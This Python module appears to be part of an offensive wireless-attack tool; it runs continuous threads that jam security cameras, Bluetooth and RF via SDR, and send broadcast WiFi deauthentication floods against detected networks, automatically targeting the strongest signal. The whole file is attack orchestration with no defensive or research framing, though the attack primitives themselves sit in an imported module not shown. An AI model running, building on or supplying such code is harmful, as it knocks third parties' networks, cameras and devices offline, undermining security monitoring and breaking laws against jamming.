import time
import threading
from .attacks import AttackOrchestrator
from .utils import (
    log_message,
    detected_networks,
    detected_networks_lock,
    running_event
)

def camera_jamming_thread(orchestrator: AttackOrchestrator, ui):
    log_message("Starting camera jamming thread", ui=ui)
    try:
        while running_event.is_set():
            with detected_networks_lock:
                if detected_networks:
                    bssid = max(detected_networks.items(), key=lambda x: x[1].get("signal", -100))[0]
                    orchestrator._camera_jam_attack(bssid, duration=60)
            if not running_event.wait(timeout=5):
                break
    except Exception as e:
        log_message(f"[ERROR] Camera jamming error: {e}", ui=ui)
    finally:
        log_message("Camera jamming thread finished", ui=ui)

def bluetooth_jam(orchestrator: AttackOrchestrator, ui):
    log_message("Starting Bluetooth jamming thread", ui=ui)
    try:
        while running_event.is_set():
            orchestrator._bluetooth_jam_attack(duration=120)
            if not running_event.wait(timeout=5):
                break
    except Exception as e:
        log_message(f"[ERROR] Bluetooth jamming error: {e}", ui=ui)
    finally:
        log_message("Bluetooth jamming thread finished", ui=ui)

def network_deauth_thread(bssid_list, interface, orchestrator: AttackOrchestrator, ui):
    log_message("Starting network deauth thread", ui=ui)
    try:
        if not bssid_list:
            log_message("No BSSIDs to deauth", ui=ui)
            return
        while running_event.is_set():
            for bssid in bssid_list:
                orchestrator._wifi_deauth_attack("FF:FF:FF:FF:FF:FF", bssid, count=1000)
            if not running_event.wait(timeout=5):
                break
    except Exception as e:
        log_message(f"[ERROR] Deauth thread error: {e}", ui=ui)
    finally:
        log_message("Network deauth thread finished", ui=ui)

def sdr_jamming_thread(bssid, orchestrator: AttackOrchestrator, ui):
    log_message("Starting SDR jamming thread", ui=ui)
    try:
        while running_event.is_set():
            orchestrator._rf_jam_attack(bssid, duration=60)
            if not running_event.wait(timeout=5):
                break
    except Exception as e:
        log_message(f"[ERROR] SDR jamming error: {e}", ui=ui)
    finally:
        log_message("SDR jamming thread finished", ui=ui)

def hybrid_jamming_thread(orchestrator: AttackOrchestrator, ui):
    log_message("Starting hybrid jamming thread", ui=ui)
    try:
        while running_event.is_set():
            with detected_networks_lock:
                if detected_networks:
                    bssid = max(detected_networks.items(), key=lambda x: x[1].get("signal", -100))[0]
                    orchestrator._hybrid_deauth_attack("FF:FF:FF:FF:FF:FF", bssid)
            if not running_event.wait(timeout=5):
                break
    except Exception as e:
        log_message(f"[ERROR] Hybrid jamming error: {e}", ui=ui)
    finally:
        log_message("Hybrid jamming thread finished", ui=ui)
